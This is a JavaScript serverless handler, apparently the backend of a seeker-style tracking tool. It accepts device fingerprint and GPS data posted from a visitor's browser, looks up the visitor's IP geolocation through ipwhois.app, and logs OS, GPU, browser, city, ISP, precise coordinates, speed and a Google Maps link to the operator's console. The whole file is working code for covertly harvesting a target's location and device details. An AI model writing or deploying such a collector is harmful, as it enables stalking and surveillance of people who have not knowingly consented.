const R = "\x1b[31m";
const G = "\x1b[32m";
const C = "\x1b[36m";
const Y = "\x1b[33m";
const W = "\x1b[0m";

export async function handler(event) {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  const data = JSON.parse(event.body || "{}");

  const {
    Os,
    Ptf,
    Cc,
    Ram,
    Ven,
    Ren,
    Ht,
    Wd,
    Brw,
    Status,
    Lat,
    Lon,
    Acc,
    Alt,
    Dir,
    Spd,
    Error,
  } = data;

  const clientIp =
    event.headers["x-nf-client-connection-ip"] || event.headers["client-ip"] || "IP Not Available";


  // Fetch IP info
  const ipRes = await fetch(`https://ipwhois.app/json/${clientIp}`);
  const ipInfo = await ipRes.json();

  const {
    ip,
    continent,
    country,
    region,
    city,
    org,
    isp,
    latitude,
    longitude,
  } = ipInfo;

  // Log Device Info
  console.log(`${Y}[!] Device Information :${W}`);
  console.log(`${G}[+] ${C}OS         : ${W}${Os}`);
  console.log(`${G}[+] ${C}Platform   : ${W}${Ptf}`);
  console.log(`${G}[+] ${C}CPU Cores  : ${W}${Cc}`);
  console.log(`${G}[+] ${C}RAM        : ${W}${Ram}`);
  console.log(`${G}[+] ${C}GPU Vendor : ${W}${Ven}`);
  console.log(`${G}[+] ${C}GPU        : ${W}${Ren}`);
  console.log(`${G}[+] ${C}Resolution : ${W}${Ht}x${Wd}`);
  console.log(`${G}[+] ${C}Browser    : ${W}${Brw}`);
  console.log(`${G}[+] ${C}Public IP  : ${W}${ip}`);

  // Log IP Info
  console.log(`\n${Y}[!] IP Information :${W}`);
  console.log(`${G}[+] ${C}Continent : ${W}${continent}`);
  console.log(`${G}[+] ${C}Country   : ${W}${country}`);
  console.log(`${G}[+] ${C}Region    : ${W}${region}`);
  console.log(`${G}[+] ${C}City      : ${W}${city}`);
  console.log(`${G}[+] ${C}Org       : ${W}${org}`);
  console.log(`${G}[+] ${C}ISP       : ${W}${isp}`);

  // Log Location Info (if available)
  if (Status === "success") {
    console.log(`\n${Y}[!] Location Information :${W}`);
    console.log(`${G}[+] ${C}Latitude  : ${W}${Lat}`);
    console.log(`${G}[+] ${C}Longitude : ${W}${Lon}`);
    console.log(`${G}[+] ${C}Accuracy  : ${W}${Acc}`);
    console.log(`${G}[+] ${C}Altitude  : ${W}${Alt}`);
    console.log(`${G}[+] ${C}Direction : ${W}${Dir}`);
    console.log(`${G}[+] ${C}Speed     : ${W}${Spd}`);
    console.log(`${G}[+] ${C}Google Maps : ${W}https://www.google.com/maps/place/${Lat?.replace(
      " deg",
      ""
    )}+${Lon?.replace(" deg", "")}`);
  } else {
    console.log(`${R}[-] ${C}Location Error: ${R}${Error}${W}`);
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ success: true }),
  };
}
